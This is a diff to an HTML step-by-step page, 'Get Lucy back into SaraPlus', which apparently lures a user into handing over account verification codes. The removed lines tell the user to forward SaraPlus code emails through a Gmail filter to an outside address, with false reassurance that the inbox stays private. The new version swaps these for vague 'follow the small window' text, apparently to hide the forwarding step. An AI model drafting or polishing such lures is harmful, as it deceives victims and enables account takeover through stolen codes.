@@ -47,10 +47,6 @@ button:focus-visible{outline:3px solid var(--ring);outline-offset:2px}
 button.done{background:var(--ok);color:#fff}
 .web{background:var(--card);padding:18px;display:flex;flex-direction:column;align-items:center;gap:8px;text-align:center}
 .box{width:190px;max-width:100%;border:2px solid var(--ring);border-radius:7px;padding:7px;font-family:var(--mono);letter-spacing:.25em}
-.dialog{max-width:340px;margin:14px auto;background:var(--card);border-radius:12px;padding:16px;box-shadow:0 8px 24px rgba(0,0,0,.18);display:flex;flex-direction:column;gap:8px;text-align:center}
-.dialog .q{font-weight:600}
-.opt{border:1px solid var(--line);border-radius:7px;padding:6px}
-.opt.pick{background:var(--accent);color:var(--on-accent);border-color:var(--accent)}
 .ok{border-color:var(--ok)}
 .ok .num{background:var(--ok);color:#fff}
 .help{background:var(--soft);border-radius:12px;padding:16px;font-size:.95rem}
@@ -59,7 +55,7 @@ button.done{background:var(--ok);color:#fff}
 <div class="wrap">
   <header>
     <h1>Get Lucy back into SaraPlus</h1>
-    <p class="lede">SaraPlus just needs to see one code on Lucy's computer. It takes about 2 minutes: you paste one line and type one code, and Lucy does the rest. Your password stays the same.</p>
+    <p class="lede">SaraPlus just needs to see one code on Lucy's computer. It takes 2 minutes, up to 7 the first time. Your password stays the same.</p>
   </header>
 
   <section class="step">
@@ -107,22 +103,8 @@ sales will start coming through.</div>
   </section>
 
   <section class="step">
-    <div class="head"><div class="num">5</div><h2>If a small window opens, follow it</h2><span class="time">2 min, once</span></div>
-    <p>This lets Lucy type SaraPlus's codes for you from now on, so you won't have to do this again. It only happens one time. If no window opens, skip to the end.</p>
-    <div class="screen" aria-hidden="true">
-      <div class="dialog">
-        <div class="q">Are your SaraPlus codes emailed to you@gmail.com?</div>
-        <div class="opt pick">Yes, that one</div>
-        <div class="opt">No, a different address</div>
-      </div>
-    </div>
-    <ul>
-      <li>Pick the email your codes go to. Gmail opens by itself.</li>
-      <li>Click <b>Add a forwarding address</b>, paste with <kbd>⌘ Cmd</kbd> + <kbd>V</kbd> (alphaletereporting@gmail.com), then <b>Next</b>, <b>Proceed</b> and <b>OK</b>.</li>
-      <li>Click <b>OK</b> on the small window and wait up to 3 minutes.</li>
-      <li>Gmail opens once more. Click <b>Create filter</b>, check <b>Forward it to</b>, pick our address, and click <b>Create filter</b> again.</li>
-    </ul>
-    <p class="note">Only SaraPlus's code emails get forwarded. The rest of your inbox stays private. The small windows repeat each click, so you don't need to keep this page open.</p>
+    <div class="head"><div class="num">5</div><h2>If a small window opens, follow it</h2><span class="time">up to 5 min, once</span></div>
+    <p>It only happens once.</p>
   </section>
 
   <section class="step ok">
